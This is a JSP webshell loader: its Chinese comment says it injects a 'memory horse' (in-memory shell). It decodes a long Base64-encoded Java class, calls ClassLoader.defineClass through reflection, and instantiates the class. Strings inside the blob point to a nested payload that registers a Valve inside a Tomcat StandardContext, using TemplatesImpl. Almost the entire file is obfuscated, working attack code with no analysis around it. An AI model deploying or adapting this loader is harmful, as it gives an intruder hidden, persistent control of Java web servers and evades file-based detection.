<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>
<%
    /**
     * 通过defindClass方法直接加载字节码注入内存马
     */
    ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
    String str = "yv66vgAAADQAbwoAGQA7CAA8CgA9AD4KAD8AQAgAQQoAQgBDCgBCAEQHAEUIAEYIAEcKABgASAgASQcAJAgASggASwcATAoACABNCgAZAE4KAEIATwoAUABRCgBQAFIHAFMKABYAVAcAVQcAVgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTGFkZE1lbVNoZWxsczsBAAVjb2RlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABmRlY29kZQEAAltCAQAGYUNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAFvAQA8TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy90cmF4L1RlbXBsYXRlc0ltcGw7AQAHYUNsYXNzMQEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEACkV4Y2VwdGlvbnMBAA1zZXRGaWVsZFZhbHVlAQA5KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA29iagEAEkxqYXZhL2xhbmcvT2JqZWN0OwEACUZpZWxkTmFtZQEABnNldE9iagEADVN0YWNrTWFwVGFibGUHAFMBAApTb3VyY2VGaWxlAQARYWRkTWVtU2hlbGxzLmphdmEMABoAGwEKRHl2NjZ2Z0FBQURRQVRnb0FEd0FxQ2dBckFDd0tBQ3NBTFFjQUxnb0FCQUF2Q3dBd0FERUhBRElIQURNS0FBZ0FLZ29BQndBMENRQTFBRFlJQURjS0FEZ0FPUWNBT2djQU93RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJKTWIyTmhiRlpoY21saFlteGxWR0ZpYkdVQkFBUjBhR2x6QVFBS1RHRmtaRlpoYkhabE93RUFGWGRsWW1Gd2NFTnNZWE56VEc5aFpHVnlRbUZ6WlFFQU1reHZjbWN2WVhCaFkyaGxMMk5oZEdGc2FXNWhMMnh2WVdSbGNpOVhaV0poY0hCRGJHRnpjMHh2WVdSbGNrSmhjMlU3QVFBTGMzUmhibVJoY21SRGRIZ0JBQ3BNYjNKbkwyRndZV05vWlM5allYUmhiR2x1WVM5amIzSmxMMU4wWVc1a1lYSmtRMjl1ZEdWNGREc0JBQWwwY21GdWMyWnZjbTBCQUhJb1RHTnZiUzl6ZFc0dmIzSm5MMkZ3WVdOb1pTOTRZV3hoYmk5cGJuUmxjbTVoYkM5NGMyeDBZeTlFVDAwN1cweGpiMjB2YzNWdUwyOXlaeTloY0dGamFHVXZlRzFzTDJsdWRHVnlibUZzTDNObGNtbGhiR2w2WlhJdlUyVnlhV0ZzYVhwaGRHbHZia2hoYm1Sc1pYSTdLVllCQUFoa2IyTjFiV1Z1ZEFFQUxVeGpiMjB2YzNWdUwyOXlaeTloY0dGamFHVXZlR0ZzWVc0dmFXNTBaWEp1WVd3dmVITnNkR012UkU5Tk93RUFDR2hoYm1Sc1pYSnpBUUJDVzB4amIyMHZjM1Z1TDI5eVp5OWhjR0ZqYUdVdmVHMXNMMmx1ZEdWeWJtRnNMM05sY21saGJHbDZaWEl2VTJWeWFXRnNhWHBoZEdsdmJraGhibVJzWlhJN0FRQUtSWGhqWlhCMGFXOXVjd2NBUEFFQXBpaE1ZMjl0TDNOMWJpOXZjbWN2WVhCaFkyaGxMM2hoYkdGdUwybHVkR1Z5Ym1Gc0wzaHpiSFJqTDBSUFRUdE1ZMjl0TDNOMWJpOXZjbWN2WVhCaFkyaGxMM2h0YkM5cGJuUmxjbTVoYkM5a2RHMHZSRlJOUVhocGMwbDBaWEpoZEc5eU8weGpiMjB2YzNWdUwyOXlaeTloY0dGamFHVXZlRzFzTDJsdWRHVnlibUZzTDNObGNtbGhiR2w2WlhJdlUyVnlhV0ZzYVhwaGRHbHZia2hoYm1Sc1pYSTdLVllCQUFocGRHVnlZWFJ2Y2dFQU5VeGpiMjB2YzNWdUwyOXlaeTloY0dGamFHVXZlRzFzTDJsdWRHVnlibUZzTDJSMGJTOUVWRTFCZUdselNYUmxjbUYwYjNJN0FRQUhhR0Z1Wkd4bGNnRUFRVXhqYjIwdmMzVnVMMjl5Wnk5aGNHRmphR1V2ZUcxc0wybHVkR1Z5Ym1Gc0wzTmxjbWxoYkdsNlpYSXZVMlZ5YVdGc2FYcGhkR2x2YmtoaGJtUnNaWEk3QVFBS1UyOTFjbU5sUm1sc1pRRUFEV0ZrWkZaaGJIWmxMbXBoZG1FTUFCQUFFUWNBUFF3QVBnQS9EQUJBQUVFQkFEQnZjbWN2WVhCaFkyaGxMMk5oZEdGc2FXNWhMMnh2WVdSbGNpOVhaV0poY0hCRGJHRnpjMHh2WVdSbGNrSmhjMlVNQUVJQVF3Y0FSQXdBUlFCR0FRQW9iM0puTDJGd1lXTm9aUzlqWVhSaGJHbHVZUzlqYjNKbEwxTjBZVzVrWVhKa1EyOXVkR1Y0ZEFFQUNWWmhiSFpsYVcxd2JBd0FPZ0JIQndCSURBQkpBRW9CQUEvbWlKSG9vcXZtaWFmb29Zemt1b1lIQUVzTUFFd0FUUUVBQ0dGa1pGWmhiSFpsQVFCQVkyOXRMM04xYmk5dmNtY3ZZWEJoWTJobEwzaGhiR0Z1TDJsdWRHVnlibUZzTDNoemJIUmpMM0oxYm5ScGJXVXZRV0p6ZEhKaFkzUlVjbUZ1YzJ4bGRBRUFPV052YlM5emRXNHZiM0puTDJGd1lXTm9aUzk0WVd4aGJpOXBiblJsY201aGJDOTRjMngwWXk5VWNtRnVjMnhsZEVWNFkyVndkR2x2YmdFQUVHcGhkbUV2YkdGdVp5OVVhSEpsWVdRQkFBMWpkWEp5Wlc1MFZHaHlaV0ZrQVFBVUtDbE1hbUYyWVM5c1lXNW5MMVJvY21WaFpEc0JBQlZuWlhSRGIyNTBaWGgwUTJ4aGMzTk1iMkZrWlhJQkFCa29LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0FRQU1aMlYwVW1WemIzVnlZMlZ6QVFBbktDbE1iM0puTDJGd1lXTm9aUzlqWVhSaGJHbHVZUzlYWldKU1pYTnZkWEpqWlZKdmIzUTdBUUFqYjNKbkwyRndZV05vWlM5allYUmhiR2x1WVM5WFpXSlNaWE52ZFhKalpWSnZiM1FCQUFwblpYUkRiMjUwWlhoMEFRQWZLQ2xNYjNKbkwyRndZV05vWlM5allYUmhiR2x1WVM5RGIyNTBaWGgwT3dFQUhpaE1iM0puTDJGd1lXTm9aUzlqWVhSaGJHbHVZUzlXWVd4MlpUc3BWZ0VBRUdwaGRtRXZiR0Z1Wnk5VGVYTjBaVzBCQUFOdmRYUUJBQlZNYW1GMllTOXBieTlRY21sdWRGTjBjbVZoYlRzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVTNSeVpXRnRBUUFIY0hKcGJuUnNiZ0VBRlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFZnQWhBQTRBRHdBQUFBQUFBd0FCQUJBQUVRQUJBQklBQUFDQkFBTUFBd0FBQUM4cXR3QUJ1QUFDdGdBRHdBQUVUQ3UyQUFXNUFBWUJBTUFBQjAwc3V3QUlXYmNBQ2JZQUNySUFDeElNdGdBTnNRQUFBQUlBRXdBQUFCb0FCZ0FBQUJVQUJBQVdBQTRBRndBYkFCZ0FKZ0FaQUM0QUdnQVVBQUFBSUFBREFBQUFMd0FWQUJZQUFBQU9BQ0VBRndBWUFBRUFHd0FVQUJrQUdnQUNBQUVBR3dBY0FBSUFFZ0FBQUQ4QUFBQURBQUFBQWJFQUFBQUNBQk1BQUFBR0FBRUFBQUFmQUJRQUFBQWdBQU1BQUFBQkFCVUFGZ0FBQUFBQUFRQWRBQjRBQVFBQUFBRUFId0FnQUFJQUlRQUFBQVFBQVFBaUFBRUFHd0FqQUFJQUVnQUFBRWtBQUFBRUFBQUFBYkVBQUFBQ0FCTUFBQUFHQUFFQUFBQWtBQlFBQUFBcUFBUUFBQUFCQUJVQUZnQUFBQUFBQVFBZEFCNEFBUUFBQUFFQUpBQWxBQUlBQUFBQkFDWUFKd0FEQUNFQUFBQUVBQUVBSWdBQkFDZ0FBQUFDQUNrPQcAVwwAWABbBwBcDAAjAF0BADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsBwBeDABfAGAMAGEAYgEAOmNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy90cmF4L1RlbXBsYXRlc0ltcGwBAAVfbmFtZQEACGFkZFZhbHZlDAAtAC4BAApfYnl0ZWNvZGVzAQBDY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVHJhbnNmb3JtZXJGYWN0b3J5SW1wbAEACV90ZmFjdG9yeQEAQ2NvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy90cmF4L1RyYW5zZm9ybWVyRmFjdG9yeUltcGwMAGMAZAwAZQBmDABnAGgHAGkMAGoAawwAbABtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAbgAbAQAMYWRkTWVtU2hlbGxzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAPamF2YS9sYW5nL0NsYXNzAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAObmV3VHJhbnNmb3JtZXIBACMoKUxqYXZheC94bWwvdHJhbnNmb3JtL1RyYW5zZm9ybWVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADc2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQAPcHJpbnRTdGFja1RyYWNlACEAGAAZAAAAAAACAAEAGgAbAAIAHAAAAPMABgAGAAAAUyq3AAESAky4AAMrtgAETRIFuAAGTi22AAfAAAg6BBkEEgkSCrgACxkEEgwEvQANWQMsU7gACxIOuAAGOgUZBBIPGQW2AAfAABC4AAsZBLYAEVexAAAAAwAdAAAALgALAAAACQAEAAoABwALAA8ADAAVAA0AHgAOACcADwA2ABAAPQARAEwAEgBSABMAHgAAAD4ABgAAAFMAHwAgAAAABwBMACEAIgABAA8ARAAjACQAAgAVAD4AJQAmAAMAHgA1ACcAKAAEAD0AFgApACYABQAqAAAAFgACABUAPgAlACsAAwA9ABYAKQArAAUALAAAAAQAAQAWAAkALQAuAAEAHAAAAJwAAwAEAAAAHSq2ABIrtgATTi0EtgAULSostgAVpwAITi22ABexAAEAAAAUABcAFgADAB0AAAAeAAcAAAAXAAkAGAAOABkAFAAcABcAGgAYABsAHAAdAB4AAAA0AAUACQALAC8AMAADABgABAAxADIAAwAAAB0AMwA0AAAAAAAdADUAIgABAAAAHQA2ADQAAgA3AAAABwACVwcAOAQAAgA5AAAAAgA6AFoAAAAKAAEAPwA9AFkACQ==";
    byte[] decode = Base64.getDecoder().decode(str);
    try {
        Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
        Method defineClass = aClass.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class zhangsan = (Class)defineClass.invoke(clzLoader, "addMemShells", decode, 0, decode.length);
        zhangsan.newInstance();
    } catch (Exception e) {
        e.printStackTrace();
    }

%>